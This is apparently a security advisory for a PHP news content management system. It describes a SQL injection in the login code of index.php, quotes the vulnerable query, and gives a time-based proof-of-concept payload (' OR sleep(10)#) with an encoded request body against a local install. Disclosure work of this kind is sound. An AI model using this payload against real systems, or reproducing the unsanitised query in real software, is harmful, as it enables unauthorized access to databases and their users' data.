## About project:
The Content Management System In PHP is a simple project that allows users to post and manage various kinds of news content.

## Vulnerability Description:
- There is a sql injection vulnerability in the login part of the index.php file. It allows an attacker to manipulate the SQL query and potentially perform unauthorized actions on the database. 

## Vulnerable Code Section:
```php
$query = "SELECT * FROM users WHERE username = '$username'";
$result = mysqli_query($conn, $query) or die(mysqli_error($conn));
```
- In this line, the `$username` variable is directly embedded into the SQL query without proper handling. This allows an attacker to inject malicious SQL code.

## Proof of Concept (PoC):
- Location: `http://localhost/NEWS-BUZZ/index.php`
- Time-Based SQL Injection Payload: `' OR sleep(10)#`

user_name=admin%27+or+sleep%2810%29%23&user_password=adminpass&login=
```
- The response will come called time by using `sleep()` function.

## Impact:
- In a time-based SQL injection attack, an attacker manipulates SQL queries to measure response times and infer information based on delays. This type of attack is useful when the application doesnâ€™t return direct errors or output that can be used to assess query behavior.
An attacker can use time-based SQL injection to extract the contents of a database.
